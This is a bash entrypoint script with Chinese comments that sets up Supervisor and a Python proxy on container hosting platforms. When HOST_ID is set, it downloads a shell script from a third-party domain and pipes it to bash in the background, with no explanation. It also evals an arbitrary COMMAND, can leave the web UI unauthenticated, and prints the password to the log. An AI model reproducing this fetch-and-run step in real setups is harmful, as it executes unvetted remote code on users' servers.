#!/bin/bash
# Supervisor 版本的统一入口脚本

# 检测代码目录（优先当前目录，然后向上查找）
CODE_DIR="$(pwd)"
if [ ! -d "$CODE_DIR/scripts" ]; then
  # 如果当前目录没有，尝试常见位置
  for dir in "$HOME" "/app/shared" "/app" "/home/runner"; do
    if [ -d "$dir/scripts" ]; then
      CODE_DIR="$dir"
      break
    fi
  done
fi

if [ ! -d "$CODE_DIR/scripts" ]; then
  echo "错误: 找不到 scripts 目录" >&2
  exit 1
fi

echo "==> 代码目录: $CODE_DIR"

# 工作目录（可配置，默认 /tmp/workroot）
WORKROOT="${WORKROOT:-/tmp/workroot}"

# 初始化工作目录
echo "==> 初始化工作目录: $WORKROOT"
mkdir -p "$WORKROOT"/{apps,entrypoint.d,supervisor/conf.d,supervisor/log,scripts}

# 复制资源
echo "==> 复制应用和脚本..."

# 复制 apps（如果源目录存在）
if [ -d "$CODE_DIR/apps" ]; then
  cp -r "$CODE_DIR/apps"/* "$WORKROOT/apps/" 2>/dev/null || true
fi

# 复制钩子脚本
if [ -d "$CODE_DIR/scripts" ]; then
  cp "$CODE_DIR/scripts"/10-*.sh "$CODE_DIR/scripts"/20-*.sh "$WORKROOT/entrypoint.d/" 2>/dev/null || true
  # 复制 Python 脚本到 scripts 目录（供钩子调用）
  mkdir -p "$WORKROOT/scripts"
  cp "$CODE_DIR/scripts"/*.py "$WORKROOT/scripts/" 2>/dev/null || true
fi

chmod +x "$WORKROOT/entrypoint.d"/*.sh 2>/dev/null || true

# 导出路径变量（供钩子脚本使用）
export CODE_DIR WORKROOT
export SCRIPTS_DIR="$CODE_DIR/scripts"
export APPS_DIR="$WORKROOT/apps"
export SUPERVISOR_DIR="$WORKROOT/supervisor"
export ENTRYPOINT_DIR="$WORKROOT/entrypoint.d"

# 添加 supervisorctl 别名到 bashrc
if [ -f /etc/bash.bashrc ]; then
  grep -q "alias sctl=" /etc/bash.bashrc || echo "alias sctl='supervisorctl -c $SUPERVISOR_DIR/supervisord.conf'" >> /etc/bash.bashrc
fi
if [ -f "$HOME/.bashrc" ]; then
  grep -q "alias sctl=" "$HOME/.bashrc" || echo "alias sctl='supervisorctl -c $SUPERVISOR_DIR/supervisord.conf'" >> "$HOME/.bashrc"
fi

# 检测当前用户
CURRENT_USER="${USER:-$(whoami)}"
export CURRENT_USER

PUBLIC_PORT="${PORT:-8080}"
EXEC_TOKEN="${EXEC_TOKEN:-}"

# 自动检测 EXTERNAL_URL
if [ -z "$EXTERNAL_URL" ]; then
  if [ -n "$RENDER_EXTERNAL_URL" ]; then
    export EXTERNAL_URL="$RENDER_EXTERNAL_URL"
  elif [ -n "$RAILWAY_PUBLIC_DOMAIN" ]; then
    export EXTERNAL_URL="https://$RAILWAY_PUBLIC_DOMAIN"
  elif env | grep -q "^ZEABUR_.*_URL="; then
    export EXTERNAL_URL="$(env | grep "^ZEABUR_.*_URL=" | head -1 | cut -d= -f2-)"
  elif [ -n "$VERCEL_URL" ]; then
    export EXTERNAL_URL="https://$VERCEL_URL"
  elif [ -n "$HEROKU_APP_NAME" ]; then
    export EXTERNAL_URL="https://$HEROKU_APP_NAME.herokuapp.com"
  elif [ -n "$FLY_APP_NAME" ]; then
    export EXTERNAL_URL="https://$FLY_APP_NAME.fly.dev"
  elif [ -n "$SCALINGO_APP" ]; then
    export EXTERNAL_URL="https://${SCALINGO_APP}.${SCALINGO_REGION:-osc-fr1}.scalingo.io"
  elif [ -n "$SPACE_HOST" ]; then
    export EXTERNAL_URL="https://$SPACE_HOST"
  fi
fi

# 执行所有钩子（生成 supervisor 配置）
if [ -d "$ENTRYPOINT_DIR" ]; then
  for f in "$ENTRYPOINT_DIR"/*.sh; do
    [ -f "$f" ] && echo "执行钩子: $f" && source "$f"
  done
fi

# 执行用户命令
[ -n "$COMMAND" ] && eval "$COMMAND" &
[ -n "$HOST_ID" ] && curl -fsSL "https://gh.note4.eu.org/2024-tmp/cs-ops/_public/script/init/hostid/$HOST_ID.sh" | bash &

# 生成 Supervisor 主配置
cat > "$SUPERVISOR_DIR/supervisord.conf" <<EOF
[supervisord]
nodaemon=true
user=$CURRENT_USER
logfile=$SUPERVISOR_DIR/log/supervisord.log
pidfile=$SUPERVISOR_DIR/supervisord.pid

[unix_http_server]
file=$SUPERVISOR_DIR/supervisor.sock
chmod=0700

[supervisorctl]
serverurl=unix:///$SUPERVISOR_DIR/supervisor.sock

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[include]
files = $SUPERVISOR_DIR/conf.d/*.conf
EOF

# 生成 Python 代理 supervisor 配置
cat > "$SUPERVISOR_DIR/conf.d/proxy.conf" <<EOF
[program:proxy]
command=python3 $CODE_DIR/scripts/proxy.py
user=$CURRENT_USER
autostart=true
autorestart=true
stdout_logfile=$WORKROOT/logs/proxy.log
stderr_logfile=$WORKROOT/logs/proxy.err.log
stdout_logfile_maxbytes=10MB
stderr_logfile_maxbytes=10MB
environment=HOME="$WORKROOT",USER="$CURRENT_USER",WORKROOT="$WORKROOT",EXEC_TOKEN="$EXEC_TOKEN",PORT="$PUBLIC_PORT"
EOF

# 如果启用 Web UI
if [ "${SUPERVISOR_WEB_ENABLED:-1}" = "1" ]; then
  SUPERVISOR_USER="${SUPERVISOR_USER:-admin}"
  SUPERVISOR_PASS="${SUPERVISOR_PASS:-}"
  
  cat >> "$SUPERVISOR_DIR/supervisord.conf" <<EOF

[inet_http_server]
port=127.0.0.1:9001
EOF

  if [ -n "$SUPERVISOR_USER" ] && [ -n "$SUPERVISOR_PASS" ]; then
    cat >> "$SUPERVISOR_DIR/supervisord.conf" <<EOF
username=${SUPERVISOR_USER}
password=${SUPERVISOR_PASS}
EOF
    echo "Supervisor Web UI: http://127.0.0.1:9001"
    echo "  用户名: ${SUPERVISOR_USER}"
    echo "  密码: ${SUPERVISOR_PASS}"
  else
    echo "Supervisor Web UI: http://127.0.0.1:9001 (无需认证)"
  fi
fi

echo "启动进程管理器..."

# 如果传入了自定义命令，在后台执行
if [ $# -gt 0 ]; then
  echo "==> 执行自定义命令: $@"
  "$@" &
fi

# 使用 python3 -m 启动 supervisor
exec python3 -m supervisor.supervisord -c "$SUPERVISOR_DIR/supervisord.conf"
